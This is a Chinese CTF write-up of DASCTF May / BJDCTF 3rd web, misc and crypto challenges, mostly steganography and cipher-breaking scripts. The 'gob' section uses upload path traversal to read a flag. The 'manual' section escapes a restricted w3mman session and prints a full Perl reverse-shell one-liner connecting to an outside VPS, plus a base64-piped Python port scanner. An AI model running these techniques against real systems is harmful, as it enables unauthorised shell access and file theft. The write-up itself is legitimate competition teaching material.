# DASCTF五月月赛 暨 BJDCTF 3rd 部分WP

阅读量 **315096**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-05-26 16:00:47

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t015c269280a114d98f.jpg)

这里是主要是crypto和misc部分的wp。

## WEB

###  gob

登录万能密码登（好像可以直接随便输？）然后是一个上传界面

![](https://i.loli.net/2020/05/23/RfcozNwBxLAv3Gq.png)

上传后易得一个二级目录uploads，然后看了看目录里都是各种马，但是因为不解析所以一个都没用。。。

但是此时发现文件上传后文件名并没有被更改，所以推测show.php文件包含也是直接包含的我们上传的文件名，所以构造一个`../../../../flag`文件进行目录穿越，再访问就可以得到flag的base64，解密即为flag（PS:必须得在同一个session中）

![](https://i.loli.net/2020/05/23/VG3YlUBnEWo9bJ4.png)

![](https://i.loli.net/2020/05/23/kmSYPdNV4g6qeHM.png)

![](https://i.loli.net/2020/05/23/vlax6wsF7CgcAVR.png)

## MISC

###  Questionnaire

F12获得flag，标准签到题

![](https://i.loli.net/2020/05/23/SOJZixI9wepd6Ns.png)

    
    
    null,null,null,null,[["1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w",null,[740,416,0]
    ]
    ]
    ]
    ,[603160739,"What is the name of the store?",null,0,[[539054317,null,0,null,[[4,302,["Haolinju|haolinju"]
    ,"8cd9"]
    ]
    ]
    ]
    ,null,null,null,null,[["1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q",null,[740,416,0]
    ]
    ]
    ]
    ,[488094967," What BRAND is this food?",null,0,[[1465781074,null,0,null,[[4,302,["Daoxiangcun|daoxiangcun"]
    ,"8f00b2"]
    ]
    ]
    ]
    ,null,null,null,null,[["1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw",null,[375,458,1]
    ]
    ]
    ]
    ,[1097246628,"Which RESTAURANT are the ducks coming from? ",null,0,[[353762320,null,0,null,[[4,302,["Jingweizhai|jingweizhai"]
    ,"04e9"]
    ]
    ]
    ]
    ,null,null,null,null,[["11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw",null,[740,555,0]
    ]
    ]
    ]
    ,[1916058196,"Which PARK is this?",null,0,[[901636349,null,0,null,[[4,302,["Jingshan|jingshan"]
    ,"8009"]
    ]
    ]
    ]
    ,null,null,null,null,[["16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ",null,[740,554,0]
    ]
    ]
    ]
    ,[1044111735,"Which DISTRICT is the No.3 of Beijing?","The restaurant in question4 is in this Distric",0,[[1620980704,null,0,null,[[4,302,["Chaoyang|chaoyang"]
    ,"98ecf8"]
    ]
    ]
    ]
    ,null,null,null,null,[["1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g",null,[740,371,0]
    ]
    ]
    ]
    ,[1877231084,"Which part of the Great Wall is this?","In Huairou Distric",0,[[1337434564,null,0,null,[[4,302,["Hefangkou|hefangkou"]
    ,"427e"]
    

flag为答案后面拼起来的字符：d41d8cd98f00b204e9800998ecf8427e

* * *

###  babyweb

打开网址，一张图，下载zip，密码说是那个password_is_here

![](https://i.loli.net/2020/05/23/67DIfmYgjRL4cCN.png)

然后F12发现

![](https://i.loli.net/2020/05/23/9MsAQykx1nlDcdX.png)

于是想到可能是宽字节隐写，然后找到在线工具[网站](https://offdev.net/demos/zwsp-steg-js)解密，得到`zerowidthcharactersinvisible`，解压后得到一张倒叙的图，脚本一把梭

    
    
    a = open('f14g.png','rb').read()
    f = a[::-1]
    b = open('flag.png','wb').write(f)
    

得到一堆奇怪字符

![](https://i.loli.net/2020/05/23/7I9ohuP5EpLb31g.png)

前三个是MINIMOYS, 4-6是银河密码，7-9是跳舞的小人，最后两个是鸟图腾

得到

UVWHZAITWAU

所以flag：MD5(‘BJD{UVWHZAITWAU}’)

* * *

###  /bin/cat 2

进去后是一张大的图片，里面有很多 小的图片，小的图片有两种。

然后如果将页面缩小，可以隐约看到一个二维码

所以方法一：写脚本脚本，然后生成二维码，再将图片替换——长度减一半，扫二维码后md5即可

exp

    
    
    from PIL import Image
    from pyzbar.pyzbar import decode
    import hashlib
    
    p1 = Image.open('11.png').convert('RGB')    #第一种类型的图片
    p2 = Image.open('12.png').convert('RGB')    #第二种类型的图片
    a,b = p1.size
    dif = []
    for y in range(b):
        for x in range(a):
            if p1.getpixel((x,y))!=p2.getpixel((x,y)):
                dif.append((x,y))
    mark = dif[0]
    
    p = Image.open('res.png').convert('RGB')    #最大的一张图片
    aa,bb = p.size
    data = []
    for y in range(0,bb,50):
        for x in range(0,aa,100):
            if p.getpixel((x+mark[0],y+mark[1])) == p1.getpixel(mark):
                data.append('1')
            else:
                data.append('0')
    
    B = Image.new('L',(10,10),255)
    W = Image.new('L',(10,10),0)
    np = Image.new('L',(290,290),0)
    for y in range(29):
        for x in range(29):
            if data[x+29*y] == '0':
                np.paste(B,(10*x,10*y))
            else:
                np.paste(W,(10*x,10*y))
    np.save('r.png')
    pp = Image.open('r.png')
    barcodes = decode(pp)
    for barcode in barcodes:
        barcodeData = barcode.data.decode("utf-8")
        print(hashlib.md5(barcodeData.encode()).hexdigest())
    

方法二：直接截图，然后放进Stegsolve，改一下色道可以得到

![](https://i.loli.net/2020/05/24/k7LxYFi5AZMs9cz.jpg)

然后改一下宽高，就能扫出来了（支付宝扫码能力比较强）。

* * *

###  manual

首先ssh链接，得到

    
    
    % ssh ctf@183.129.189.60 -p 10128
    
    Welcome to BJD3rd Games ~
    
    🐀🐾🌴🚜🍋🐊🍇🐂🍓🎑🐈🐟💁🚟🍗
    
    The above login passwd is encrypted.
    
    leads:
     - http://emoji.taqini.space
     - suika
    
    Try to figure out where is your
    
             #           #####   #####  
    ######  ##     ##   #     # #     #
    #      # #    #  #  #     #       #
    #####    #   #    #  ######    ###  
    #        #   ######       #    #    
    #        #   #    # #     #         
    #      ##### #    #  #####     #    
    
    p.s. Maybe you have lots of xiaowenhao after login,
         I will help u look up the manual pages of flag.
    
    Now, input passwd to start the game:
    

上面那个网址就是虎符misc中的emoji替代加密，密钥是`suika`，他是一种替代加密，去网址得到字典后脚本替代得到ssh密码：`C0dEmOj!so4UnNy`

    
    
    a = '🌷👱🌠🌴👷🎆🍀👼🎉🍇👰🎍🍋💁🎑🍏🚶🎁🍓💑🏀🍄💪🎳🍗👆😶🚘🐀😮🚜🐻😴⚓🐔😝🚢🐥😕🚟🐊😞🚥🐉😭🚽🐟😩⌛🐚😳☀😜😀🚆🐈😄🚊🐴😊🚌🐾🐂🐪🚏🐗😚🌹🚓🐁😑🚗👩😥'
    b = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+'
    ss = '🐀🐾🌴🚜🍋🐊🍇🐂🍓🎑🐈🐟💁🚟🍗'
    print(ss.translate(str.maketrans(a,b)))
    

登录上去后是一个留言板加上一个自带的man
flag指令，但是你不能退出man，退出man的话就直接退出了ssh，但是这个man又不是一般的man，他是w3mman，然后上面的`External
Program Settings`中的`External
browser`可以命令执行（这相当于是默认启动项，可以插入指令让它执行），使用perl来反弹shell，于是构建（网上百度）得`perl -e 'use
Socket;$i="ip
addr";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
-i");};'`，将shell反弹到VPS上，然后开始疯狂查看文件以及权限，得到`f1a9.py`为700权限，hint又说不用提权，然后看见run.sh里

    
    
    #!/bin/sh
    echo "ctf:C0dEmOj!so4UnNy" | chpasswd
    chown -R root:ctf /home/ctf/
    chmod 700 /home/ctf/f1a9.py
    chmod 750 /home/ctf/msh
    /home/ctf/f1a9.py &
    
    /usr/sbin/sshd -D
    

可以看到f1a9.py在启动是就在后台运行了，但是。。。我ps怎么弄，进入`/proc`读内存都没找到有用信息，但是官方突然给hint：`f1a9.py的独白：我的真实身份是web
server`,于是恶向胆边生，俺爆破你端口，但是又因为服务器里没有nmap等可以三句话代码，使用python写进去一句话的扫描端口脚本

原码：

    
    
    import requests
    host = ' http://127.0.0.1'
    for i in range(2000,2500):
        add = host+':'+str(i)
        try:
            s = requests.get(add)
            print(i)
            print(s.text)
            exit(1)
        except:
            print(i)
            pass
    

一句话脚本：

    
    
    echo aW1wb3J0IHJlcXVlc3RzCmhvc3QgPSAnIGh0dHA6Ly8xMjcuMC4wLjEnCmZvciBpIGluIHJhbmdlKDIwMDAsMjUwMCk6CiAgICBhZGQgPSBob3N0Kyc6JytzdHIoaSkKICAgIHRyeToKICAgICAgICBzID0gcmVxdWVzdHMuZ2V0KGFkZCkKICAgICAgICBwcmludChpKQogICAgICAgIHByaW50KHMudGV4dCkKICAgICAgICBleGl0KDEpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoaSkKICAgICAgICBwYXNzCg== | base64 -d | python3
    

得到了2333端口有网页，其内容为一堆base64编码：

![](https://i.loli.net/2020/05/24/S6jkb9qFs2yhru4.png)

看到这么多base64，有可能就是base64隐写，脚本一把梭：

    
    
    import base64
    def get_base64_diff_value(s1,s2):
        table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        res = 0
        for i in range(len(s1)):
            if s1[i] != s2[i]:
                return abs(table.index(s1[i]) - table.index(s2[i]))
        return res
    
    def solve():
        lines = open('stego.txt','r').readlines()
        bin_str = ''
    
        for line in lines:
            steg_line = line.replace('n','')
            # print(steg_line)
            norm_line = base64.b64encode(base64.b64decode(steg_line)).decode()
            # print(norm_line)
            diff = get_base64_diff_value(steg_line,norm_line)
            # print(diff)
            pad_num = steg_line.count('=')
            if diff:
                bin_str += bin(diff)[2:].zfill(pad_num*2)
            else:
                bin_str += '0' * pad_num * 2
        print(bin_str)
        res_str = ''
        for j in range(int(len(bin_str)/8)):
            # print(8*j,(j+1)*8)
            res_str+=chr(int(bin_str[8*j:(j+1)*8],2))
        print(res_str[-52:])
        print(base64.b64decode(res_str[-52:]))
    
    solve()
    

得到hTtP://999.TaQini.SpAcE，上去后是

![](https://i.loli.net/2020/05/23/VC6HvEDeI2PFWAy.png)

这玩意，f12后发现有一堆奇怪的表情js：

![](https://i.loli.net/2020/05/24/lSd1q9EgKaILkDw.png)

网上在线解密aaencode得到

    
    
       /**
       * 半径，画布宽度，画布高度，画布x内边距，画布y内边距
       */
       var R = 26, canvasWidth = 400, canvasHeight = 320, OffsetX = 30, OffsetY = 30;
       var circleArr = [];
        function createCirclePoint(diffX, diffY) {
          for (var row = 0; row < 3; row++) {
            for (var col = 0; col < 3; col++) {
             // 计算圆心坐标
              var Point = {
                X: (OffsetX + col * diffX + ( col * 2 + 1) * R),
                Y: (OffsetY + row * diffY + (row * 2 + 1) * R)
              };
              circleArr.push(Point);
            }
          }
        }
        window.onload = function () {
          var canvas = document.getElementById("lockCanvas");
          canvasWidth = document.body.offsetWidth;//网页可见区域宽
          canvas.width = canvasWidth;
          canvas.height = canvasHeight;
          var ctx = canvas.getContext("2d");
          /**
           * 每行3个圆
           * OffsetX为canvas x方向内边距
           * */
          var X = (canvasWidth - 2 * OffsetX - R * 2 * 3) / 2;
          var Y = (canvasHeight - 2 * OffsetY - R * 2 * 3) / 2;
    
          createCirclePoint(X, Y);
          bindEvent(canvas, ctx);
          //CW=2*offsetX+R*2*3+2*X
          Draw(ctx, circleArr, [],null);
        }
        function Draw(ctx, circleArr, pwdArr,touchPoint) {
          var eight = ["巽","離","坤","震","☯","兌","艮","坎","乾"];
          if (pwdArr.length > 0) {
            ctx.beginPath();
            for (var i = 0; i < pwdArr.length; i++) {
              var pointIndex = pwdArr[i];
              ctx.lineTo(circleArr[pointIndex].X, circleArr[pointIndex].Y);
            }
            ctx.lineWidth = 10;
            ctx.strokeStyle = "#713fdf";
            ctx.stroke();
            ctx.closePath();
            if(touchPoint!=null){
              var lastPointIndex=pwdArr[pwdArr.length-1];
              var lastPoint=circleArr[lastPointIndex];
              ctx.beginPath();
              ctx.moveTo(lastPoint.X,lastPoint.Y);
              ctx.lineTo(touchPoint.X,touchPoint.Y);
              ctx.stroke();
              ctx.closePath();
            }
          }
          for (var i = 0; i < circleArr.length; i++) {
            var Point = circleArr[i];
            ctx.fillStyle = "#713fdf";
            ctx.beginPath();
            ctx.arc(Point.X, Point.Y, R, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            ctx.fillStyle = "#ffffff";
            ctx.beginPath();
            ctx.arc(Point.X, Point.Y, R - 3, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            // alert(Point.X+','+Point.Y)
            // var img = new Image();
            // img.src = "http://taqini.space/img/"+i+".png"; 
            // ctx.drawImage(img,Point.X-20,Point.Y-20,40,40);
    
            // if(pwdArr.indexOf(i)>=0){
            //   ctx.fillStyle = "#713fdf";
            //   ctx.beginPath();
            //   ctx.arc(Point.X, Point.Y, R -16, 0, Math.PI * 2, true);
            //   ctx.closePath();
            //   ctx.fill();
            // }
    
            ctx.font = '36px "微软雅黑"';
            ctx.textBaseline = "bottom";
            ctx.fillStyle = "#000000";
            ctx.fillText(eight[i],Point.X-18,Point.Y+20);
    
          }
        }
    
        /**
         * 计算选中的密码 
         */
        function getSelectPwd(touches,pwdArr){
          for (var i = 0; i < circleArr.length; i++) {
            var currentPoint = circleArr[i];
            var xdiff = Math.abs(currentPoint.X - touches.pageX);
            var ydiff = Math.abs(currentPoint.Y - touches.pageY);
            var dir = Math.pow((xdiff * xdiff + ydiff * ydiff), 0.5);
            if(dir > R || pwdArr.indexOf(i) >= 0)
             continue;
             pwdArr.push(i);
             break;
          }
        }
    
        /**
         * 给画布绑定事件
         */
        function bindEvent(canvas, ctx) {
          var pwdArr = [];
          var res;
          canvas.addEventListener("touchstart", function (e) {
            getSelectPwd(e.touches[0],pwdArr);
          }, false);
          canvas.addEventListener("touchmove", function (e) {
            e.preventDefault();
            var touches = e.touches[0];
            getSelectPwd(touches,pwdArr);
            ctx.clearRect(0,0,canvasWidth,canvasHeight);
            Draw(ctx,circleArr,pwdArr,{X:touches.pageX,Y:touches.pageY});
          }, false);
          canvas.addEventListener("touchend", function (e) {
            ctx.clearRect(0,0,canvasWidth,canvasHeight);
            Draw(ctx,circleArr,pwdArr,null);
            // alert("密码结果是："+pwdArr.join(""));
            res = pwdArr.join("")
            if(res=="723048561"){
              alert("flag{c967db67a5e32fef9049499daadc19e8}");
            }else{
              location.reload();
            }
            res = ""
            pwdArr=[];
          }, false);
        };
    

得到flag

## Crypto

###  bbcrypto

    
    
    # -*- coding:utf-8 -*-    import A,SALT
    from itertools import *
    
    def encrypt(m, a, si):
        c=""
        for i in range(len(m)):
            c+=hex(((ord(m[i])) * a + ord(next(si))) % 128)[2:].zfill(2)
        return c
    if __name__ == "__main__":
        m = 'flag{********************************}'
        a = A
        salt = SALT
        assert(len(salt)==3)
        assert(salt.isalpha())
        si = cycle(salt.lower())
        print("明文内容为：")
        print(m)
        print("加密后的密文为：")
        c=encrypt(m, a, si)
        print(c)
        #加密后的密文为：
        #177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d
    

是一个简单的仿射密码，c = ax+salt（mod 128）

其中a固定未知，salt是变化的，但是周期只有3

我们知道flag的格式，开头为flag

所以我们拿‘f’和‘g’来解方程，此时两个未知数，两条方程，完全可解。

解出a后，再用flag的‘l’和‘a’来解salt的另外两个值

最终解出a = 57, salt = ‘ahh’

exp:

    
    
    from Crypto.Util.number import *
    c = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d'.decode('hex')
    m = 'flag'
    
    #c[0] = ord('f')*a + b
    #c[3] = ord('g')*a + b
    a=57
    b1 = (0x17-ord('f')*a)%128
    b2 = (0x74-ord('l')*a)%128
    b3 = (0x01-ord('a')*a)%128
    
    salt='ahh'
    flag=''
    index=0
    for i in c:
        b = ord(salt[index%3])
        index+=1
        flag+=chr((ord(i)-b)*inverse(a,128)%128)
    

###  Encrypt_Img

    
    
    from numpy import array
    from PIL import Image
    from secret import Key
    
    Plaintext1 = "RC4IsInteresting"
    Plaintext2 = "ThisIsAEasyGame"
    cnt = 0
    
    
    class RC4():
        def __init__(self, Key):
            self.S = [i for i in range(256)]
            self.K = [ord(Key[i % len(Key)])*2 for i in range(256)]
            self.I, self.J = 0, 0
            self.KSA()
    
        def KSA(self):
            for i in range(256):
                j = (i+self.K[i]+self.S[i]) % 256
                self.S[i], self.S[j] = self.S[j], self.S[i]
    
        def next(self):
            self.I = (self.I+1) % 256
            self.J = (self.J+self.S[self.I]) % 256
            self.S[self.J], self.S[self.I] = self.S[self.I], self.S[self.J]
            tmp = (self.S[self.J] + self.S[self.I]) % 256
            return self.S[tmp]
    
    
    class Encrypt():
        def __init__(self, plain):
            global cnt
            cnt += 1
            self.rc4 = RC4(Key)
            self.testRC4(plain)
            flag_file = Image.open(r"flag.png")
            img = array(flag_file)
            self.enc(img)
    
        def testRC4(self, plain):
            ciphertext = 0
            for i in plain:
                ciphertext = (ciphertext << 8)+ord(i) ^ self.rc4.next()
            print("ciphertext{} = {}".format(cnt, ciphertext))
    
        def enc(self, img):
            a, b, _ = img.shape
            for x in range(0, a):
                for y in range(0, b):
                    pixel = img[x, y]
                    for i in range(0, 3):
                        pixel[i] = pixel[i] ^ self.rc4.next()
                    img[x][y] = pixel
            enc = Image.fromarray(img)
            enc.save("enc{}.png".format(cnt))
    
    
    Encrypt(Plaintext1)
    Encrypt(Plaintext2)
    
    # ciphertext1 = 12078640933356268898100798377710191641
    # ciphertext2 = 79124196547094980420644350061749775
    

题目用的流密码是一个标准RC4。我们可以看到题目加密了Plaintext1和flag的图片，然后又加密了Plaintext2和flag的图片。

这一题的切入点在题目所作的两次test。我们可以看到Plaintext1和Plaintext1相差了一个字节。然后两次加密用的是同样的key，这也就意味着两次用于加密明文的密钥流是一模一样的。所以加密两次图片的密钥流刚好有一位的错位。

鉴于RC4加密的特性，当我们有一对明文、密文我们是可以知道密钥的。然后我们可以利用Plaintext2多出来的那一个字节来知道第一次加密图片的第一位密钥。然后用这个密钥去解密，得到第一次加密的图片的第一个像素点。有了图片的原始的第一个像素点，我们也有第二次加密的图片加密后的像素点，利用这两个点我们能获得第一次加密图片的第二个key。如此循环往复，来回横跳，就可以最终恢复第一次加密的图片

exp

    
    
    from numpy import array
    from PIL import Image
    
    p1 = "g"
    P2 = ""
    c1=0x19
    c2=""
    
    k1 = ord(p1)^c1
    
    
    flag_file1 = Image.open(r"enc1.png")
    flag_file2 = Image.open(r"enc2.png")
    img1 = array(flag_file1)
    img2 = array(flag_file2)
    a, b, _ = img1.shape
    for x in range(0, a):
        for y in range(0, b):
            pixel1 = img1[x, y]
            pixel2 = img2[x, y]
            for i in range(0, 3):
                pixel2[i] = pixel2[i] ^ k1
                k1 = pixel2[i]^pixel1[i]
            img2[x][y] = pixel2
    enc2 = Image.fromarray(img2)
    
    enc2.save("flag.png")
    

得到图片

![](https://i.loli.net/2020/05/24/5lYRkX41n6dmNKh.png)

###  easyLCG

    
    
    from Crypto.Util.number import*
    from secret import flag
    
    
    class LCG:
        def __init__(self):
            self.a = getRandomNBitInteger(32)
            self.b = getRandomNBitInteger(32)
            self.m = getPrime(32)
            self.seed = getRandomNBitInteger(32)
    
        def next(self):
            self.seed = (self.a*self.seed+self.b) % self.m
            return self.seed >> 16
    
        def output(self):
            print("a = {}nb = {}nm = {}".format(self.a, self.b, self.m))
            print("state1 = {}".format(self.next()))
            print("state2 = {}".format(self.next()))
    
    
    class DH:
        def __init__(self):
            self.lcg = LCG()
            self.lcg.output()
            self.g = getRandomNBitInteger(128)
            self.m = getPrime(256)
            self.A, self.a = self.gen_AB()
            self.B, self.b = self.gen_AB()
            self.key = pow(self.A, self.b, self.m)
    
        def gen_AB(self):
            x = ''
            for _ in range(64):
                x += '1' if self.lcg.next() % 2 else '0'
            return pow(self.g, int(x, 2), self.m), int(x, 2)
    
    
    DH = DH()
    flag = bytes_to_long(flag)
    print("g = {}nA = {}nB = {}nM = {}".format(DH.g, DH.A, DH.B, DH.m))
    print("Cipher = {}".format(flag ^ DH.key))
    
    '''
    a = 3844066521
    b = 3316005024
    m = 2249804527
    state1 = 16269
    state2 = 4249
    g = 183096451267674849541594370111199688704
    A = 102248652770540219619953045171664636108622486775480799200725530949685509093530
    B = 74913924633988481450801262607456437193056607965094613549273335198280176291445
    M = 102752586316294557951738800745394456033378966059875498971396396583576430992701
    Cipher = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703
    '''
    

这一道题两个知识点，一个是LCG，一个是DHP，其中，DHP用于加密flag，我们要得到flag就要获得协商密钥。而获得协商密钥的方法就是知道一方的私钥。而双方的私钥使用LCG生成的。

LCG中的三个参数a,b,m我们都知道。然后给出了s1 和 s2 的高位。低16位未知。这里完全可以爆破。

爆破s1，然后生成s2，看高位是否与给出的s2高位一致来确定。最终爆出四个符合的值。

然后就利用四个可能的s2和a, b, m，根据题目生成密钥的方式来生成A的四个可能私钥。再利用B的公钥获得四个协商密钥。然后看解密结果，找出flag。

exp:

    
    
    from Crypto.Util.number import *
    a = 3844066521
    b = 3316005024
    m = 2249804527
    state1 = 16269
    state2 = 4249
    M = 102752586316294557951738800745394456033378966059875498971396396583576430992701
    B = 74913924633988481450801262607456437193056607965094613549273335198280176291445
    A = 102248652770540219619953045171664636108622486775480799200725530949685509093530
    c = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703
    
    for i in range(2**16):
        s = state1<<16
        s+=i
        if ((a*s+b)%m)>>16 == 4249:
            s2 = (a*s+b)%m
            print s2
            x=''
            for _ in range(64):
                s2 = (a*s2+b)%m
                x += '1' if (s2>>16) % 2 else '0'
            x = int(x,2)
            key = pow(B,x,M)
            flag = key^c
            print long_to_bytes(flag)
    

###  knapsack

    
    
    from Crypto.Util.number import *
    from functools import reduce
    
    def genKey(length):
        A, B = getPrime(64), getPrime(1025)
    
        Rn = getPrime(1024)
        key1 = [Rn//2**i for i in range(1, length+1)]
        key2 = [i*A % B for i in key1]
        return key1,key2
    
    
    def encrypt(text,key):
        Sum=0
        for i in range(len(text)):
            Sum+=int(text[i])*key[i]
        return Sum
    
    def save(Ciper,Key):
        f1=open("pub.txt","w")
        for i in range(len(Key)):
            f1.write(str(Key[i])+'n')
        f2=open("cip.txt","w")
        f2.write(hex(Ciper))
    
    
    FLAG = bin(bytes_to_long(flag.encode()))[2:]
    Key1,Key2 = genKey(len(FLAG))
    Ciper = encrypt(FLAG,Key1)
    save(Ciper,Key2)
    

这是一个超递增背包问题。但这里用的是一个超递减序列

并且对这个序列做了一次加密，加密方式为 a*A % B，其中x为序列中的每一个元素，B大于序列中最大的元素。

想要解密，我们首先需要获得A和B，然后来通过求逆来获得原序列。

获得A的方式很简单。这个序列的最小的值很小，这个时候用不到模运算，我们只需要对比较小的两个值求一个最大公因数就能得到A。

至于求B，我们找到比较大的两个数，并且满足如下关系，即$a _{i+1} < a_{i}$，（我们设最小的为$a
_0$）这是不符合序列的单调性的，也就意味着这里存在一次模运算。且这里的递减是用整除2来得到的。所以要么$a_ {i}cdot 2 – a _{i+1} =
B$，要么$a_ {i}cdot 2 + A – a_{i+1} = B$ 【因为这里是整除嘛，这不难理解】

有了原来的超递减序列，这个问题就很简单了。我们只需要对这个序列从头开始判断。如果密文大于这个元素，flag的最高位bit就是1，然后将密文减去这个元素。否则flag的这一个bit位就是0，继续下一个元素与密文的大小判断。如此循环。最后解密得到flag。

exp:

    
    
    b=335428611041311731398614259824482604248524861615176787429946575184146370361110652887115402376826444538743339055691850202034085349274540292019392290484025358504275054761608502214481606484088807087063751542648223811793597463026662881020647708165593980984857948283181770647446888695205803952635117800114545071259
    a=11243098275181678343
    with open("pub.txt")as f:
        data=f.read()
    
    data=data.split("n")[:-1]
    datai=[]
    for i in data:
        datai.append(int(i))
    dataii=[] 
    for i in datai:
        dataii.append(i*inverse(a,b)%b)
    
    c=0x8ab3086a3df540d4652c191951756a6574aca491d933e479330532f0586ce03862f82f36dea8038b8bfb0b394331d7a93050efa2a26e46d9d8ca394600456cd79e02890a2c31b02e920c28a9f27c3943ec68fe5555ff4056358f35869859d67d67702edf44b10a7690acbaeea1f4def46392922069bfb71c173a210e9ab384f7
    flag=""
    for i in dataii:
        if c>=i:
            flag+='1'
            c-=i
        else:
            flag+='0'
    print long_to_bytes(int(flag,2))
    

###  Backpacker

    
    
    import signal
    import string
    from hashlib import sha256
    from Crypto.Util.number import *
    from Crypto.Random import random
    flag = 'flag'
    
    banner = '''
     ____             _                     _             _       _   _ 
    | __ )  __ _  ___| | ___ __   __ _  ___| | _____ _ __( )___  | | | | ___  _ __ ___   ___
    |  _  / _` |/ __| |/ / '_  / _` |/ __| |/ / _  '__|// __| | |_| |/ _ | '_ ` _  / _ \
    | |_) | (_| | (__|   <| |_) | (_| | (__|   <  __/ |    __  |  _  | (_) | | | | | |  __/
    |____/ __,_|___|_|_ .__/ __,_|___|_|____|_|    |___/ |_| |_|___/|_| |_| |_|___|
                          |_|'''
    
    
    def timeout_handler(signum, frame):
        print("n[!]Sorry, timeout...")
        raise TimeoutError
    
    
    def proof_of_work():
        print("[++++++++++++++++] Proof of work [++++++++++++++++]")
        proof = ''.join(
            [random.choice(string.ascii_letters+string.digits)
             for _ in range(20)]
        )
        proof_cipher = sha256(proof.encode()).hexdigest()
        print("sha256(XXXX+{}) == {}".format(proof[4:], proof_cipher))
        guess = input("Give me XXXX: ")
        if len(guess) != 4 or sha256((guess + proof[4:]).encode()).hexdigest() != proof_cipher:
            print("[++++++++++++++++] You failed, exit... [++++++++++++++++]")
            exit(0)
        print("[++++++++++++++++] Proof of work has passed [++++++++++++++++]")
    
    
    class Knapsack:
        n = None
        elements = None
    
        def load(self, n, nbits):
            self.n = n
            self.elements = set()
            while len(self.elements) < n:
                self.elements.add(getRandomNBitInteger(nbits))
            self.elements = list(self.elements)
    
        def super_load(self, n):
            self.n = n
            self.elements = [233]
            sum = 233
            while len(self.elements) < n:
                self.elements.append(sum + getRandomRange(1, 128))
                sum += self.elements[-1]
    
        def encrypt(self):
            if not self.n or not self.elements:
                raise ValueError("[!]Something Wrong...")
            m = getRandomNBitInteger(self.n)
            m_list = [int(_) for _ in bin(m)[2:]]
            c = 0
            for i in range(self.n):
                c += m_list[i] * self.elements[i]
            return (c, m)
    
    
    def challenge_1():
        print("[++++++++++++++++] Enjoy challenge_1 [++++++++++++++++]")
        K = Knapsack()
        K.load(10, 16)
        print("[+]There are {} elements in the knapsack.".format(K.n))
        for i in range(K.n):
            print(K.elements[i])
        (c, m) = K.encrypt()
        print("[+]c = {}".format(c))
        guess = input("[-]m(hex) = ")
        try:
            guess = int(guess, 16)
            if guess == m:
                print("[++++++++++++++++] challenge_1 has passed [++++++++++++++++]")
                return
        except:
            pass
        print("[++++++++++++++++] You failed, exit... [++++++++++++++++]")
        exit(0)
    
    
    def challenge_2():
        print("[++++++++++++++++] Enjoy challenge_2 [++++++++++++++++]")
        K = Knapsack()
        K.super_load(50)
        print("[+]There are {} elements in the knapsack.".format(K.n))
        for i in range(K.n):
            print(K.elements[i])
        (c, m) = K.encrypt()
        print("[+]c = {}".format(c))
        guess = input("[-]m(hex) = ")
        try:
            guess = int(guess, 16)
            if guess == m:
                print("[++++++++++++++++] challenge_2 has passed [++++++++++++++++]")
                return
        except:
            pass
        print("[++++++++++++++++] You failed, exit... [++++++++++++++++]")
        exit(0)
    
    
    def challenge_3():
        print("[++++++++++++++++] Enjoy challenge_3 [++++++++++++++++]")
        K = Knapsack()
        K.load(100, 312)
        print("[+]There are {} elements in the knapsack.".format(K.n))
        for i in range(K.n):
            print(K.elements[i])
        (c, m) = K.encrypt()
        print("[+]c = {}".format(c))
        guess = input("[-]m(hex) = ")
        try:
            guess = int(guess, 16)
            if guess == m:
                print("[++++++++++++++++] challenge_3 has passed [++++++++++++++++]")
                print("[+]Excellent Backpacker, your flag is {}".format(flag))
                return
        except:
            pass
        print("[++++++++++++++++] You failed, exit... [++++++++++++++++]")
        exit(0)
    
    
    def main():
        proof_of_work()
        challenge_1()
        challenge_2()
        challenge_3()
    
    
    if __name__ == "__main__":
        try:
            print(banner)
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(6000000)
            main()
        except:
            pass
    

也是背包问题，一共三关。

第一关，由于数字很小。范围是0到1023，所以可以直接爆破得到。

第二关，是超递增背包问题。跟上面那个一样的。

第三关，不是超递增背包问题了，然后量比较大，数字也比较大。这里用Latiice可以解决。格长这样

![](https://i.loli.net/2020/05/24/xuzFv2IAJNlqC6y.png)

然后解起来有概率问题。就算格基规约找到了SVP为我们的目标向量，最后也会有两个解，也只有1/2的概率成功。由于本地没有sage环境，这里是半自动脚本

交互脚本，可以打到第三关，然后拿到数据

    
    
    import string 
    from Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inverse
    from pwn import *
    from pwnlib.util.iters import mbruteforce
    from hashlib import sha256
    context.log_level = "debug"
    def enc(data,m):
        m = bin(m)[2:]
        c = 0
        for i in range(len(m)):
            c += int(m[i])*data[i]
        return c
    
    sh=remote("183.129.189.60","10036")
    sh.recvuntil("sha256(XXXX+")
    suffix=sh.recv(len('SLhlaef5L6nM6pYx'))
    sh.recvuntil("== ")
    cipher=sh.recv(len('3ade7863765f07a3fbb9d853a00ffbe0485c30eb607105196b0d1854718a7b6c'))
    sh.recvuntil("XXXX: ")
